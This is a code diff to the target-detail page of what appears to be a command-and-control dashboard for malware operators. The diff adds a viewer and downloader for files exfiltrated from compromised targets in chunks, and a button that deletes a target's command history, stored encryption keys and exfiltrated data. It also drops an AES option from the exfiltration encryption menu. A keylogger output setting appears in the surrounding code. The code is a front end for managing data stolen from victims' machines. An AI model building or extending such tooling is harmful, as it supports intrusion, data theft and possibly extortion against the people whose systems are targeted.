@@ -54,6 +54,7 @@ const TargetDetail: React.FC = () => {
   const [klOutputMode, setKlOutputMode] = useState("stdout");
 
   const [showKeys, setShowKeys] = useState(false);
+  const [exfilFiles, setExfilFiles] = useState<any[]>([]);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
@@ -162,6 +163,67 @@ const TargetDetail: React.FC = () => {
     }
   };
 
+  const fetchExfilFiles = async () => {
+    if (!targetId) return;
+    try {
+      const response = await fetch(`/api/v1/targets/${targetId}/exfil`, {
+        headers: {
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        }
+      });
+      if (response.ok) {
+        const files = await response.json();
+        setExfilFiles(files);
+      }
+    } catch (error) {
+      console.error('Failed to fetch exfil files:', error);
+    }
+  };
+
+  const downloadExfilFile = (filename: string) => {
+    if (!targetId) return;
+    const token = localStorage.getItem('token');
+    window.open(`/api/v1/targets/${targetId}/exfil/${encodeURIComponent(filename)}/download?token=${token}`, '_blank');
+  };
+
+  const handleDeleteTarget = async () => {
+    if (!targetId || !selected) return;
+
+    const confirmDelete = window.confirm(
+      `Are you sure you want to PERMANENTLY DELETE target "${selected.hostname}" (${selected.ip_address})?\n\n` +
+      `This will delete:\n` +
+      `- The target record\n` +
+      `- All command history\n` +
+      `- All stored encryption keys\n` +
+      `- All exfiltrated data\n\n` +
+      `This action CANNOT be undone!`
+    );
+
+    if (!confirmDelete) return;
+
+    try {
+      const response = await fetch(`/api/v1/targets/${targetId}`, {
+        method: 'DELETE',
+        headers: {
+          'Authorization': `Bearer ${localStorage.getItem('token')}`
+        }
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        alert(`Target deleted successfully!\n\nDeleted:\n- ${result.deleted_commands} commands\n- ${result.deleted_keys} encryption keys`);
+        // Navigate back to targets list
+        window.location.href = '/';
+      } else {
+        const error = await response.json();
+        alert(`Failed to delete target: ${error.detail}`);
+      }
+    } catch (error) {
+      console.error('Failed to delete target:', error);
+      alert('Failed to delete target. Please try again.');
+    }
+  };
+
   const handleRefresh = () => {
     if (targetId) dispatch(fetchCommands(targetId));
   };
@@ -190,9 +252,16 @@ const TargetDetail: React.FC = () => {
           <button
             className="btn-secondary"
             onClick={handleToggleStatus}
-            style={{ padding: "0.2rem 0.6rem", fontSize: "0.8rem" }}
+            style={{ padding: "0.2rem 0.6rem", fontSize: "0.8rem", marginRight: "0.5rem" }}
           >
             {selected.status === "inactive" ? "Activate" : "Deactivate"}
+          </button>
+          <button
+            className="btn-danger"
+            onClick={handleDeleteTarget}
+            style={{ padding: "0.2rem 0.6rem", fontSize: "0.8rem" }}
+          >
+            Delete Target
           </button>
         </dd>
       </dl>
@@ -334,7 +403,6 @@ const TargetDetail: React.FC = () => {
               <select value={exfilEncryption} onChange={(e) => setExfilEncryption(e.target.value)}>
                 <option value="none">None (base64 only)</option>
                 <option value="xor">XOR + base64</option>
-                <option value="aes">AES-256-CBC + base64</option>
               </select>
             </div>
           </>
@@ -390,9 +458,75 @@ const TargetDetail: React.FC = () => {
                   {expandedCmd === cmd.id && (
                     <tr>
                       <td colSpan={4} style={{ padding: 0 }}>
-                        <pre style={{ margin: 0, borderRadius: 0, border: "none", borderTop: "1px solid #333" }}>
-                          {cmd.output || (cmd.status === "completed" ? "(empty output)" : "Waiting for result...")}
-                        </pre>
+                        {cmd.module_name === "exfil" ? (
+                          <div style={{ padding: "1rem", borderTop: "1px solid #333" }}>
+                            <div style={{ marginBottom: "0.5rem" }}>
+                              <button
+                                onClick={fetchExfilFiles}
+                                className="btn-secondary"
+                                style={{ marginBottom: "1rem" }}
+                              >
+                                Refresh Exfil Files
+                              </button>
+                            </div>
+                            {exfilFiles.length > 0 ? (
+                              <div>
+                                <h4>Exfiltrated Files:</h4>
+                                <table style={{ width: "100%", marginTop: "0.5rem" }}>
+                                  <thead>
+                                    <tr>
+                                      <th>Filename</th>
+                                      <th>Progress</th>
+                                      <th>Encryption</th>
+                                      <th>Status</th>
+                                      <th>Action</th>
+                                    </tr>
+                                  </thead>
+                                  <tbody>
+                                    {exfilFiles.map((file, idx) => (
+                                      <tr key={idx}>
+                                        <td style={{ fontFamily: "monospace" }}>{file.filename}</td>
+                                        <td>{file.chunks_received}/{file.total_chunks}</td>
+                                        <td>{file.encryption}</td>
+                                        <td>
+                                          <span style={{
+                                            color: file.is_complete ? "#4caf50" : "#ff9800",
+                                            fontWeight: "bold"
+                                          }}>
+                                            {file.is_complete ? "Complete" : "Incomplete"}
+                                          </span>
+                                        </td>
+                                        <td>
+                                          {file.is_complete ? (
+                                            <button
+                                              onClick={() => downloadExfilFile(file.filename)}
+                                              className="btn-primary"
+                                              style={{ padding: "0.25rem 0.5rem", fontSize: "0.8rem" }}
+                                            >
+                                              Download
+                                            </button>
+                                          ) : (
+                                            <span style={{ color: "#888", fontSize: "0.8rem" }}>
+                                              Waiting for chunks...
+                                            </span>
+                                          )}
+                                        </td>
+                                      </tr>
+                                    ))}
+                                  </tbody>
+                                </table>
+                              </div>
+                            ) : (
+                              <p style={{ color: "#888", fontStyle: "italic" }}>
+                                No exfiltrated files found. Click "Refresh Exfil Files" to check.
+                              </p>
+                            )}
+                          </div>
+                        ) : (
+                          <pre style={{ margin: 0, borderRadius: 0, border: "none", borderTop: "1px solid #333" }}>
+                            {cmd.output || (cmd.status === "completed" ? "(empty output)" : "Waiting for result...")}
+                          </pre>
+                        )}
                       </td>
                     </tr>
                   )}
